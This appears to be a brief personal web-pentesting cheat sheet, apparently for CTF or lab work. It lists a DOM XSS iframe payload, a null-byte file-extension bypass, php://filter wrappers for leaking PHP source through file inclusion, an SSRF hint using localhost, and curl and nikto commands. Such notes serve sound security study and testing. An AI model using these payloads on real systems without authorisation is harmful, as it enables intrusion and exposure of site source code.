## Discovery
[[GoBuster]]

## Reverse shell
[[Reverse Shell#Web reverse shell]]

Web stuff

Poison null byte (doesn't work with PHP major version 5)
Terminates URL. Can be used to bypass certain file extensions not being allowed. Use %200.allowedFileType after other file
`%2500`

### XSS DOM
```
<iframe src="javascript:alert(`xss`)">
```

### Curl POST
```
curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>
```

### Vulnerabilities
```
nikto -h <IP>
```

If URL has proxy in search try `localhost` or `127.0.0.1`
### PHP
Actual source code of the page encoded using base64:
`php://filter/convert.base64-encode/resource=index`
If there is a filetype filter:
`php://filter/convert.base64-encode/cat/resource=index`

